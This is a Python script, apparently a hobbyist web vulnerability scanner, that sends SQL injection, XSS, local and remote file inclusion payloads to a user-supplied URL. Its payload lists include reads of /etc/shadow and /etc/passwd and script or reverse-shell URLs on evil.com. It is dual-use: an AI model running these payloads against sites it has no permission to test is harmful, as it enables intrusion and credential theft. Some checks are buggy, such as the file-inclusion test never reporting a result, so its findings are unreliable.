#little improvements from the original version, now it runs faster, and finish the script with no errors

ascii_art = """
=======================================================================
*     *       *          *     *       *          *     *       *
       *     *       *          *
  *     *       *          *     *       *          *     *       *
  *     *       *          *     *       *          *     *       *
    *     *    *              *        *

███████╗ ██████╗ █████╗ ███╗   ██╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗ 
██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗
███████╗██║     ███████║██╔██╗ ██║███████╗███████║██║█████╗  ██║     ██║  ██║
╚════██║██║     ██╔══██║██║╚██╗██║╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║
███████║╚██████╗██║  ██║██║ ╚████║███████║██║  ██║██║███████╗███████╗██████╔╝
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ 
                                                                             


        *         Made By Fear.io | V 1.0.1
             *       *           *     *       *          *     *
  *        *       *          *     *       *
             *       *           *     *       *          *  *  *
*     *       *          *     *       *          *     *     *
=======================================================================


"""

print(ascii_art)


import requests
from urllib.parse import urljoin, urlparse, urlencode
from bs4 import BeautifulSoup

# Custom codes
VULN_FOUND = 999
NO_VULN_FOUND = 777

# Expanded list of payloads for vulnerabilities
SQL_PAYLOADS = [
    "' OR '1'='1", "' OR 'a'='a", "';--", "' OR 1=1--", "' AND 1=1", "' UNION SELECT null, null, null--",
    "' AND SLEEP(5)--", "' OR 1=1 LIMIT 1--", "1' OR 1=1--", "' OR 1=1 WAITFOR DELAY '0:0:5'--", 
    "' OR 1=1#",
    "admin' --", "' OR 'x'='x", "' UNION ALL SELECT 1,2,3--", "' AND 1=1 ORDER BY 1--", "admin' --",
    "' AND 1=2 UNION SELECT null, null, null--", "a' OR 'a'='a", "a' OR 1=1#", "' UNION SELECT 'a','b'--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<script>document.cookie='xss';</script>",
    "<iframe src='javascript:alert(1)'></iframe>", "<body onload=alert(1)>", "<input type='image' src='x' onerror='alert(1)'>",
    "<input onfocus=alert(1)>", "<a href='javascript:alert(1)'>Click me</a>", "<svg/onload=alert(1)>",
    "<input type='button' onclick='alert(1)'>", "<form action=''><input type='text' value='<script>alert(1)</script>'></form>", 
    "<img src='x' onerror='alert(1)'>", "<button onClick=alert(1)>Click</button>", "<object data='javascript:alert(1)'></object>",
    "<input type='image' src='' onerror='alert(1)'>", "<input type='text' value='x' onfocus='alert(1)'>", 
    "<embed src='javascript:alert(1)'></embed>", "<script src='//evil.com/xss.js'></script>", 
    "<input type='file' onfocus='alert(1)'>", "<textarea onfocus='alert(1)'></textarea>"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd", "../../../../windows/win.ini", "../../../../var/www/.htpasswd", "../../../../etc/shadow", 
    "../../../../etc/group", "../../../../var/log/syslog", "../../../../proc/self/environ", "../../../../etc/apache2/envvars", 
    "../../../../var/tmp/sensitive_file.txt", "../../../../etc/mysql/my.cnf", "../../../../etc/hostname",
    "../../../../usr/share/wordlists/rockyou.txt", "../../../../var/www/html/.htpasswd", "../../../../etc/cron.d/cronjob", 
    "../../../../usr/bin/evil_script.sh", "../../../../tmp/evil_script.php", "../../../../etc/httpd/conf/httpd.conf", 
    "../../../../etc/memcached.conf", "../../../../etc/postgresql/postgresql.conf.sample", "../../../../etc/nginx/nginx.conf"
]

RFI_PAYLOADS = [
    "http://evil.com/shell.txt", "http://evil.com/malicious.php", "http://evil.com/malicious.js", "http://evil.com/exploit",
    "http://evil.com/phishing_page.html", "http://evil.com/exploit.jpg", "http://evil.com/evil.php", "http://evil.com/malicious_image.jpg", 
    "http://evil.com/malicious.jpg", "http://evil.com/evil_script.js", "http://evil.com/phishing_script.php", 
    "http://evil.com/malicious_payload.php", "http://evil.com/payload.php", "http://evil.com/shellcode.txt", 
    "http://evil.com/evil_malicious.py", "http://evil.com/shellcode.bin", "http://evil.com/evil_malicious.js", 
    "http://evil.com/reverse_shell.php", "http://evil.com/malicious_txt.php", "http://evil.com/malicious_payload.exe"
]

COMMON_DIRECTORIES = [
    "/admin/", "/backup/", "/.git/", "/config/", "/cgi-bin/", "/.svn/", "/.hg/", "/tmp/", "/dev/", "/var/log/", "/.idea/",
    "/docs/", "/public/", "/private/", "/uploads/", "/test/", "/config", "/logs/", "/debug/", "/assets/", "/images/",
    "/scripts/", "/api/", "/db/", "/admin_panel/"
]

SECURITY_HEADERS = {
    "X-Frame-Options": ["DENY", "SAMEORIGIN"],
    "Strict-Transport-Security": ["max-age=31536000", "max-age=0"],
    "Content-Security-Policy": ["default-src 'self'"],
    "X-XSS-Protection": ["1; mode=block"],
    "X-Content-Type-Options": ["nosniff"]
}

# Function to perform SQL Injection testing
def test_sql_injection(url, params):
    print("Testing for SQL Injection...")
    for param in params:
        for payload in SQL_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params)
                if "syntax error" in response.text.lower() or "mysql" in response.text.lower() or "SQL" in response.text:
                    print(f"[SQL Injection] Vulnerable parameter: {param} | Payload: {payload}")
                    return VULN_FOUND
            except Exception as e:
                print(f"Error occurred during SQL Injection testing: {e}")
    return None

# Function to perform XSS testing
def test_xss(url, params):
    print("Testing for XSS...")
    for param in params:
        for payload in XSS_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params)
                if payload in response.text:
                    print(f"[XSS] Vulnerable parameter: {param} | Payload: {payload}")
                    return VULN_FOUND
            except Exception as e:
                print(f"Error occurred during XSS testing: {e}")
    return None

# Function to perform LFI testing
def test_lfi(url, params):
    print("Testing for LFI...")
    for param in params:
        for payload in LFI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params)
                if "root:" in response.text:
                    print("Local File Inclusion (LFI) vulnerability found!")
            except Exception as e:
                print(f"An error occurred: {e}")
# Function to perform RFI testing
def test_rfi(url, params):
    print("Testing for RFI...")
    for param in params:
        for payload in RFI_PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            response = requests.get(url, params=test_params)
            if "evil.com" in response.text:
                print(f"[RFI] Vulnerable parameter: {param} | Payload: {payload}")
                return VULN_FOUND
    return None

# Function to perform directory listing checks
def test_directory_listing(url):
    print("Testing for Directory Listing...")
    for dir_path in COMMON_DIRECTORIES:
        test_url = urljoin(url, dir_path)
        response = requests.get(test_url)
        if response.status_code == 200 and "index of" in response.text.lower():
            print(f"[Directory Listing] Accessible path: {test_url}")
            return VULN_FOUND
    return None

# Function to perform header security checks
def test_security_headers(url):
    print("Testing for Security Headers...")
    response = requests.get(url)
    headers = response.headers
    for header, values in SECURITY_HEADERS.items():
        if header not in headers or headers[header] not in values:
            print(f"[Security Headers] Missing or misconfigured header: {header}")
            return VULN_FOUND
    return None

# Function to find parameters on the page
def find_params(url):
    print("Finding URL parameters...")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    params = {}
    for form in soup.find_all("form"):
        for input_tag in form.find_all("input"):
            name = input_tag.get("name")
            if name:
                params[name] = "test"
    return params

# Main function to run the scanner
def check_vulnerabilities(url):
    print(f"Scanning URL: {url}")
    params = find_params(url)
    try:
        if test_sql_injection(url, params) == VULN_FOUND: return VULN_FOUND
        if test_xss(url, params) == VULN_FOUND: return VULN_FOUND
        if test_lfi(url, params) == VULN_FOUND: return VULN_FOUND
        if test_rfi(url, params) == VULN_FOUND: return VULN_FOUND
        if test_directory_listing(url) == VULN_FOUND: return VULN_FOUND
        if test_security_headers(url) == VULN_FOUND: return VULN_FOUND

        print("No vulnerabilities found.")
        return NO_VULN_FOUND
    except Exception as e:
        print(f"Error occurred during scanning: {e}")
        return NO_VULN_FOUND

def scan_target(url):
    result = check_vulnerabilities(url)
    if result == VULN_FOUND:
        print(f"Vulnerability found at {url}!")
    else:
        print(f"No vulnerabilities found at {url}.")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ").strip()
    scan_target(target_url)
